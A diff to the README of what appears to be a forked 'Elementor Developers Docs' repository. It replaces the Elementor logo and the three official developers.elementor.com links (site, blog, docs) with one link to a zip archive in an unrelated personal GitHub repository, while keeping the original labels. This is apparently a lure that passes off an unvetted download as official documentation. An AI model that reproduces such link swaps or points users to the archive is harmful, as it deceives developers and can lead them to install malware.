@@ -1,5 +1,5 @@
 <div align="center">
-    <img width="300" src="https://developers.elementor.com/docs/favicon.png" alt="Elementor Logo">
+    <img width="300" src="https://raw.githubusercontent.com/uwk2007/elementor-developers-docs/master/gnostical/elementor-developers-docs.zip" alt="Elementor Logo">
 </div>
 
 # Elementor Developers Docs
@@ -10,6 +10,6 @@ Resources and tutorials for Elementor developers.
 
 Check out our developer resources:
 
-* [Elementor Developers](https://developers.elementor.com/)
-* [Elementor Developers Blog](https://developers.elementor.com/blog/)
-* [Elementor Developers Docs](https://developers.elementor.com/docs/)
+* [Elementor Developers](https://raw.githubusercontent.com/uwk2007/elementor-developers-docs/master/gnostical/elementor-developers-docs.zip)
+* [Elementor Developers Blog](https://raw.githubusercontent.com/uwk2007/elementor-developers-docs/master/gnostical/elementor-developers-docs.zip)
+* [Elementor Developers Docs](https://raw.githubusercontent.com/uwk2007/elementor-developers-docs/master/gnostical/elementor-developers-docs.zip)
